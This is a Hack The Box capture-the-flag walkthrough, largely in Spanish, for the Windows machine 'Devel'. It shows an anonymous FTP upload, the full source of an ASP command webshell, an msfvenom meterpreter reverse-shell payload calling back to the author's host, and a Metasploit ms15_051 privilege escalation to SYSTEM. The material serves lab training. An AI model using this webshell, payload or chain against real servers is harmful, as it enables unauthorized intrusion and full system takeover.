---
title: Devel
date: 2025-12-10 18:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, devel ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/0fb6455a29eb4f2682f04a780ce26cb1.png
    alt: Hack The Box
---

> Devel
Windows · Easy 

## Task 1

What is the name of the service is running on TCP port 21 on the target machine?

``` shell
┌──(pmartinezr㉿kali)-[/etc/openvpn]
└─$ nmap -p- -sCVS -T 5 --min-rate 500 10.129.10.116
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-10 14:26 CET
Nmap scan report for 10.129.10.116
Host is up (0.042s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.30 seconds
```

> Microsoft ftpd

## Task 2

Which basic FTP command can be used to upload a single file onto the server?

> put 

## Task 3

Are files put into the FTP root available via the webserver?

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ ftp 10.129.10.116
Connected to 10.129.10.116.
220 Microsoft FTP Service
Name (10.129.10.116:pmartinezr): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put webshell.asp 
```
Una debilidad es dejar un usuario ```anonymous```, pero más debil es dejar que dicho usuario puedas usar ```put``` 
Subo una webshell [https://github.com/tennc/webshell/blob/master/asp/webshell.asp](https://github.com/tennc/webshell/blob/master/asp/webshell.asp)

``` html
<!--
ASP Webshell
Working on latest IIS 
Referance :- 
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp
http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script
http://www.w3schools.com/asp/
-->


<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>


<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's local address:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>
</HTML>
```

Al acceder a la webshell lanzo el comando dir para saber el directorio actual ```c:\windows\system32\inetsrv``` así que la respuesta debe ser "yes" entendiendo que el directorio root del servidor debe estar en ```c:\inetpub\wwwroot```

> yes

## Task 4

What file extension is executed as a script on this webserver? Don't include the .

Lo subí como ```.asp``` pero también se conoce como aspx

> aspx

## Task 5 

Which metasploit reconnaissance module can be used to list possible privilege escalation paths on a compromised system?

En este punto entiendo que tenemos que conseguir meterpreter para poder usarlo para escalar privilegios, por lo que pensé en descargar
netcat y subirlo, luego con la webshell deberíamos poder ejecutar el comando que inicie netcat y obtener una shell reversa para llevarlo 
a cabo

``` shell
┌──(pmartinezr㉿kali)-[~/htb/devel]
└─$ ftp 10.129.10.116
Connected to 10.129.10.116.
220 Microsoft FTP Service
Name (10.129.10.116:pmartinezr): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put nc.exe
local: nc.exe remote: nc.exe
229 Entering Extended Passive Mode (|||49160|)
125 Data connection already open; Transfer starting.
100% |********************************************************************************|   177 KiB  735.17 KiB/s    --:-- ETA
226 Transfer complete.
182200 bytes sent in 00:00 (603.13 KiB/s)
```

``` shell
┌──(pmartinezr㉿kali)-[~/htb/devel]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.224 LPORT=4444 -f aspx > reverse_shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2865 bytes
```

Creamos un payload para que se ejecute en el servidor cuando visitemos la web http://10.129.10.116/reverse_shell.aspx

``` shell
msf exploit(multi/handler) > windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > run 
[*] Started reverse TCP handler on 10.10.15.224:4444 
[*] Sending stage (188998 bytes) to 10.129.10.116
[*] Meterpreter session 1 opened (10.10.15.224:4444 -> 10.129.10.116:49163) at 2025-12-10 18:55:33 +0100
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Al visitar la web reverse_shell.aspx nos debería proporcional un meterpreter. El módulo suggester, ya lo hemos usado en varios retos y 
esto mismo se pregunta en varios retos de HTB. 

> local_exploit_suggester


## Submit the flag located on the babis user's desktop.

``` shell

============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!                                                                                                            
 4   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 11  exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 12  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 13  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 14  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 15  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 16  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
```

El modulo sugiere los siguiente exploits

``` shell 
msf exploit(windows/local/ms15_051_client_copy_image) > run
[*] Started reverse TCP handler on 10.10.15.224:4444 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching netsh to host the DLL...
[+] Process 3136 launched.
[*] Reflectively injecting the DLL into 3136...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (188998 bytes) to10.129.10.116
[*] Meterpreter session 2 opened (10.10.15.224:4444 ->10.129.10.116:49161) at 2025-12-11 18:36:02 +0100
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
Después de probar varios de los exploits que parecían más pausibles, encuentro el que funciona 

``` shell
c:\Users\babis\Desktop>type user.txt
type user.txt
ed5c370a4effcc08************
```

## Submit the flag located on the administrator's desktop.

``` shell
c:\Users\Administrator\Desktop>type root.txt
type root.txt
4404381017d00eb3860************5
```

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/3)
